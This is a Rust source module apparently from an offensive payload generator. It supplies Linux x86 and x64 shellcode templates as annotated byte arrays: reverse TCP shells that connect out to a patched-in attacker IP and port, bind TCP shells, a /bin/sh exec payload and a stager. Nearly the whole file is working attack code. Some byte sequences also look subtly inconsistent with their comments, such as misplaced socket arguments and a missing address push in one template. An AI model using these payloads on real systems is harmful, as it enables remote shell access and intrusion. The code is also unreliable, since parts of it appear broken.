//! Shellcode templates for Linux payloads.
//!
//! These are hand-crafted, position-independent shellcode sequences
//! derived from assembly templates. Each template uses placeholder
//! bytes that get patched with actual connection parameters.
//!
//! Placeholders:
//! - `0x7f, 0x7f, 0x7f, 0x7f` — IPv4 address (4 bytes)
//! - `0x7e, 0x7e` — Port number (2 bytes, network byte order)

// Auto-generated shellcode from build.rs (assembled from .asm files)
include!(concat!(env!("OUT_DIR"), "/shellcode.rs"));

/// A compiled shellcode template.
#[derive(Debug, Clone)]
pub struct ShellcodeTemplate {
    /// Raw shellcode bytes
    pub bytes: Vec<u8>,
    /// Human-readable name
    pub name: String,
    /// Target platform
    pub platform: String,
    /// Target architecture
    pub arch: String,
    /// Size in bytes
    pub size: usize,
    /// Whether it's null-free
    pub null_free: bool,
}

impl ShellcodeTemplate {
    pub fn new(name: &str, platform: &str, arch: &str, bytes: Vec<u8>) -> Self {
        let null_free = !bytes.contains(&0x00);
        Self {
            size: bytes.len(),
            null_free,
            name: name.to_string(),
            platform: platform.to_string(),
            arch: arch.to_string(),
            bytes,
        }
    }
}

/// Get a shellcode template for the given payload type and platform.
pub fn get_template(
    payload_type: &crate::PayloadType,
    platform: &crate::Platform,
    arch: &crate::Arch,
) -> anyhow::Result<ShellcodeTemplate> {
    match (payload_type, platform, arch) {
        (crate::PayloadType::ReverseTcp, crate::Platform::Linux, crate::Arch::X64) => {
            Ok(reverse_tcp_linux_x64())
        }
        (crate::PayloadType::ReverseTcp, crate::Platform::Linux, crate::Arch::X86) => {
            Ok(reverse_tcp_linux_x86())
        }
        (crate::PayloadType::BindTcp, crate::Platform::Linux, crate::Arch::X64) => {
            Ok(bind_tcp_linux_x64())
        }
        (crate::PayloadType::BindTcp, crate::Platform::Linux, crate::Arch::X86) => {
            Ok(bind_tcp_linux_x86())
        }
        (crate::PayloadType::CmdExec, crate::Platform::Linux, crate::Arch::X64) => {
            Ok(cmd_exec_linux_x64())
        }
        (crate::PayloadType::Stager, crate::Platform::Linux, crate::Arch::X64) => {
            Ok(stager_linux_x64())
        }
        _ => Err(anyhow::anyhow!(
            "No template for {}/{}/{} — use reverse_tcp/linux/x64, reverse_tcp/linux/x86, bind_tcp/linux/x64, bind_tcp/linux/x86, cmd_exec/linux/x64, or stager/linux/x64",
            payload_type,
            platform,
            arch
        )),
    }
}

// ─── Reverse TCP — Linux/x86_64 ───────────────────────────────────────
//
// Assembly source (nasm -f bin reverse_tcp.asm -o reverse_tcp.bin):
//
// ```nasm
// bits 64
// global _start
//
// _start:
//     ; socket(AF_INET, SOCK_STREAM, 0)
//     xor rdi, rdi          ; rdi = 0 (clean)
//     push rdi              ; protocol = 0
//     pop rsi               ; rsi = 0
//     mov edi, 2            ; AF_INET
//     mov dl, 1             ; SOCK_STREAM
//     push 41               ; sys_socket
//     pop rax
//     syscall
//
//     ; Save socket fd
//     xchg rdi, rax         ; rdi = sockfd
//
//     ; connect(sockfd, &sockaddr, 16)
//     ; sockaddr_in: { sin_family=2, sin_port=PORT, sin_addr=IP, sin_zero=0 }
//     push rsi              ; sin_zero (8 bytes of 0)
//     push rsi
//     ; IP placeholder: 0x7f7f7f7f
//     push 0x7f7f7f7f
//     ; Port placeholder: 0x7e7e
//     push word 0x7e7e
//     push word 2           ; AF_INET
//     mov rsi, rsp          ; rsi = &sockaddr
//     push 16               ; sizeof(sockaddr)
//     pop rdx
//     push 42               ; sys_connect
//     pop rax
//     syscall
//
//     ; dup2(sockfd, 0), dup2(sockfd, 1), dup2(sockfd, 2)
//     push 3
//     pop rsi
// loop:
//     dec rsi
//     js done               ; if rsi < 0, jump to done
//     push 33               ; sys_dup2
//     pop rax
//     syscall
//     jmp loop
//
// done:
//     ; execve("/bin/sh", NULL, NULL)
//     xor rdx, rdx
//     push rdx
//     mov rbx, 0x68732f6e69622f2f  ; "//bin/sh" (little-endian)
//     push rbx
//     mov rdi, rsp
//     push 59               ; sys_execve
//     pop rax
//     syscall
// ```

fn reverse_tcp_linux_x64() -> ShellcodeTemplate {
    ShellcodeTemplate::new(
        "linux/x64/shell/reverse_tcp",
        "linux",
        "x64",
        vec![
            // socket(AF_INET, SOCK_STREAM, 0)
            0x48, 0x31, 0xff, // xor rdi, rdi
            0x57, // push rdi
            0x5e, // pop rsi
            0xbf, 0x02, 0x00, 0x00, 0x00, // mov edi, 2 (AF_INET)
            0xb2, 0x01, // mov dl, 1 (SOCK_STREAM)
            0x6a, 0x29, // push 41 (sys_socket)
            0x58, // pop rax
            0x0f, 0x05, // syscall
            // Save socket fd
            0x48, 0x97, // xchg rdi, rax
            // connect(sockfd, &sockaddr, 16)
            0x56, // push rsi
            0x56, // push rsi
            // IP placeholder
            0x68, 0x7f, 0x7f, 0x7f, 0x7f, // push dword 0x7f7f7f7f
            // Port placeholder
            0x66, 0x68, 0x7e, 0x7e, // push word 0x7e7e
            0x66, 0x6a, 0x02, // push word 2 (AF_INET)
            0x48, 0x89, 0xe6, // mov rsi, rsp
            0x6a, 0x10, // push 16
            0x5a, // pop rdx
            0x6a, 0x2a, // push 42 (sys_connect)
            0x58, // pop rax
            0x0f, 0x05, // syscall
            // dup2 loop
            0x6a, 0x03, // push 3
            0x5e, // pop rsi
            // loop:
            0x48, 0xff, 0xce, // dec rsi
            0x78, 0x12, // js done (offset 0x12)
            0x6a, 0x21, // push 33 (sys_dup2)
            0x58, // pop rax
            0x0f, 0x05, // syscall
            0xeb, 0xf3, // jmp loop (offset -0x0d)
            // done: execve("/bin/sh")
            0x48, 0x31, 0xd2, // xor rdx, rdx
            0x52, // push rdx
            0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
            0x00, // mov rbx, "//bin/sh\x00"
            0x53, // push rbx
            0x48, 0x89, 0xe7, // mov rdi, rsp
            0x6a, 0x3b, // push 59 (sys_execve)
            0x58, // pop rax
            0x0f, 0x05, // syscall
        ],
    )
}

// ─── Reverse TCP — Linux/x86 ──────────────────────────────────────────

fn reverse_tcp_linux_x86() -> ShellcodeTemplate {
    ShellcodeTemplate::new(
        "linux/x86/shell/reverse_tcp",
        "linux",
        "x86",
        vec![
            // socket(2, 1, 0)
            0x31, 0xc0, 0x31, 0xdb, 0x31, 0xc9, 0x31, 0xd2, 0x52, // push edx
            0x6a, 0x01, // push 1
            0x6a, 0x02, // push 2
            0x89, 0xe1, // mov ecx, esp
            0xb0, 0x66, // mov al, 102
            0xb3, 0x01, // mov bl, 1
            0xcd, 0x80, // int 0x80
            0x97, // xchg edi, eax
            // connect
            0x52, // push edx
            0x52, // push edx
            0x68, 0x7f, 0x7f, 0x7f, 0x7f, // push dword IP
            0x66, 0x68, 0x7e, 0x7e, // push word port
            0x66, 0x6a, 0x02, // push word AF_INET
            0x89, 0xe1, // mov ecx, esp
            0x6a, 0x10, // push 16
            0x5a, // pop edx
            0x51, // push ecx
            0x57, // push edi
            0x89, 0xe1, // mov ecx, esp
            0xb0, 0x66, // mov al, 102
            0xb3, 0x03, // mov bl, 3
            0xcd, 0x80, // int 0x80
            // dup2 loop
            0x6a, 0x03, // push 3
            0x5e, // pop esi
            // loop:
            0x4e, // dec esi
            0x78, 0x10, // js done
            0x31, 0xc0, // xor eax, eax
            0xb0, 0x3f, // mov al, 63
            0x89, 0xfb, // mov ebx, edi
            0xcd, 0x80, // int 0x80
            0xeb, 0xf3, // jmp loop
            // done: execve("/bin/sh")
            0x31, 0xc0, // xor eax, eax
            0x50, // push eax
            0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89,
            0xe3, // mov ebx, esp
            0x50, // push eax
            0x89, 0xe2, // mov edx, esp
            0x53, // push ebx
            0x89, 0xe1, // mov ecx, esp
            0xb0, 0x0b, // mov al, 11
            0xcd, 0x80, // int 0x80
        ],
    )
}

// ─── Bind TCP — Linux/x86_64 ──────────────────────────────────────────

fn bind_tcp_linux_x64() -> ShellcodeTemplate {
    ShellcodeTemplate::new(
        "linux/x64/shell/bind_tcp",
        "linux",
        "x64",
        vec![
            // socket(AF_INET, SOCK_STREAM, 0)
            0x48, 0x31, 0xff, // xor rdi, rdi
            0x57, // push rdi
            0x5e, // pop rsi
            0xbf, 0x02, 0x00, 0x00, 0x00, // mov edi, 2
            0xb2, 0x01, // mov dl, 1
            0x6a, 0x29, // push 41 (sys_socket)
            0x58, // pop rax
            0x0f, 0x05, // syscall
            0x48, 0x97, // xchg rdi, rax (save sockfd)
            // bind(sockfd, &sockaddr, 16)
            0x56, // push rsi
            0x56, // push rsi
            0x68, 0x00, 0x00, 0x00, 0x00, // push dword 0 (INADDR_ANY)
            0x66, 0x68, 0x7e, 0x7e, // push word PORT (placeholder)
            0x66, 0x6a, 0x02, // push word AF_INET
            0x48, 0x89, 0xe6, // mov rsi, rsp
            0x6a, 0x10, // push 16
            0x5a, // pop rdx
            0x6a, 0x31, // push 49 (sys_bind)
            0x58, // pop rax
            0x0f, 0x05, // syscall
            // listen(sockfd, 0)
            0x6a, 0x32, // push 50 (sys_listen)
            0x58, // pop rax
            0x6a, 0x00, // push 0 (backlog)
            0x5e, // pop rsi
            0x0f, 0x05, // syscall
            // accept(sockfd, NULL, NULL)
            0x6a, 0x2b, // push 43 (sys_accept)
            0x58, // pop rax
            0x48, 0x31, 0xf6, // xor rsi, rsi (NULL addr)
            0x48, 0x31, 0xd2, // xor rdx, rdx (NULL len)
            0x0f, 0x05, // syscall
            0x48, 0x97, // xchg rdi, rax (new fd)
            // dup2 loop
            0x6a, 0x03, // push 3
            0x5e, // pop rsi
            // loop:
            0x48, 0xff, 0xce, // dec rsi
            0x78, 0x12, // js done
            0x6a, 0x21, // push 33 (sys_dup2)
            0x58, // pop rax
            0x0f, 0x05, // syscall
            0xeb, 0xf3, // jmp loop
            // done: execve("/bin/sh")
            0x48, 0x31, 0xd2, // xor rdx, rdx
            0x52, // push rdx
            0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
            0x00, // mov rbx, "//bin/sh\x00"
            0x53, // push rbx
            0x48, 0x89, 0xe7, // mov rdi, rsp
            0x6a, 0x3b, // push 59 (sys_execve)
            0x58, // pop rax
            0x0f, 0x05, // syscall
        ],
    )
}

// ─── Bind TCP — Linux/x86 ─────────────────────────────────────────────

fn bind_tcp_linux_x86() -> ShellcodeTemplate {
    ShellcodeTemplate::new(
        "linux/x86/shell/bind_tcp",
        "linux",
        "x86",
        vec![
            // socket(2, 1, 0)
            0x31, 0xc0, 0x31, 0xdb, 0x31, 0xc9, 0x31, 0xd2, 0x52, // push edx
            0x6a, 0x01, // push 1
            0x6a, 0x02, // push 2
            0x89, 0xe1, // mov ecx, esp
            0xb0, 0x66, // mov al, 102
            0xb3, 0x01, // mov bl, 1
            0xcd, 0x80, // int 0x80
            0x97, // xchg edi, eax
            // bind
            0x52, // push edx
            0x52, // push edx
            0x66, 0x68, 0x7e, 0x7e, // push word PORT
            0x66, 0x6a, 0x02, // push word AF_INET
            0x89, 0xe1, // mov ecx, esp
            0x6a, 0x10, // push 16
            0x5a, // pop edx
            0x51, // push ecx
            0x57, // push edi
            0x89, 0xe1, // mov ecx, esp
            0xb0, 0x66, // mov al, 102
            0xb3, 0x02, // mov bl, 2 (bind)
            0xcd, 0x80, // int 0x80
            // listen
            0xb0, 0x66, // mov al, 102
            0xb3, 0x04, // mov bl, 4 (listen)
            0x6a, 0x00, // push 0
            0x51, // push ecx
            0x57, // push edi
            0x89, 0xe1, // mov ecx, esp
            0xcd, 0x80, // int 0x80
            // accept
            0xb0, 0x66, // mov al, 102
            0xb3, 0x05, // mov bl, 5 (accept)
            0x31, 0xc9, // xor ecx, ecx
            0x31, 0xd2, // xor edx, edx
            0x51, // push ecx
            0x57, // push edi
            0x89, 0xe1, // mov ecx, esp
            0xcd, 0x80, // int 0x80
            0x97, // xchg edi, eax
            // dup2 loop
            0x6a, 0x03, // push 3
            0x5e, // pop esi
            // loop:
            0x4e, // dec esi
            0x78, 0x10, // js done
            0x31, 0xc0, // xor eax, eax
            0xb0, 0x3f, // mov al, 63
            0x89, 0xfb, // mov ebx, edi
            0xcd, 0x80, // int 0x80
            0xeb, 0xf3, // jmp loop
            // done: execve("/bin/sh")
            0x31, 0xc0, // xor eax, eax
            0x50, // push eax
            0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89,
            0xe3, // mov ebx, esp
            0x50, // push eax
            0x89, 0xe2, // mov edx, esp
            0x53, // push ebx
            0x89, 0xe1, // mov ecx, esp
            0xb0, 0x0b, // mov al, 11
            0xcd, 0x80, // int 0x80
        ],
    )
}

// ─── Command Execute — Linux/x86_64 ───────────────────────────────────

fn cmd_exec_linux_x64() -> ShellcodeTemplate {
    ShellcodeTemplate::new(
        "linux/x64/exec/cmd",
        "linux",
        "x64",
        vec![
            0x48, 0x31, 0xd2, // xor rdx, rdx
            0x52, // push rdx
            0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
            0x00, // mov rbx, "//bin/sh\x00"
            0x53, // push rbx
            0x48, 0x89, 0xe7, // mov rdi, rsp
            0x6a, 0x3b, // push 59 (sys_execve)
            0x58, // pop rax
            0x0f, 0x05, // syscall
        ],
    )
}

// ─── Stager — Linux/x86_64 ────────────────────────────────────────────

fn stager_linux_x64() -> ShellcodeTemplate {
    ShellcodeTemplate::new(
        "linux/x64/stager/reverse_tcp",
        "linux",
        "x64",
        STAGER_LINUX_X64.to_vec(),
    )
}
